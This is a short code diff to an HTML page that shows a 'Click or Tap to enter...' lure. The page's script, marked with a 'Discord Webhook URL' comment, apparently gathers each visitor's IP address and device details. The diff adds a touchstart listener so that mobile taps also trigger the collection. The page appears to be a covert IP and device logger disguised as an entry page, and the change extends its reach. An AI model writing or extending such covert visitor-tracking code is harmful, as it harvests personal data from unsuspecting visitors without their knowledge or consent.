@@ -20,7 +20,7 @@
   </style>
 </head>
 <body>
-  <h1 id="click-to-enter">Click to enter...</h1>
+  <h1 id="click-to-enter">Click or Tap to enter...</h1>
   <div id="info"></div>
   <script>
     // Discord Webhook URL
@@ -96,8 +96,9 @@
        .catch(error => console.error('Failed to get IP address:', error));
     }
 
-    // Add event listener to the document to collect device information on click
+    // Add event listeners for click and touch events to collect device information
     document.addEventListener('click', collectDeviceInfo);
+    document.addEventListener('touchstart', collectDeviceInfo);
   </script>
 </body>
 </html>
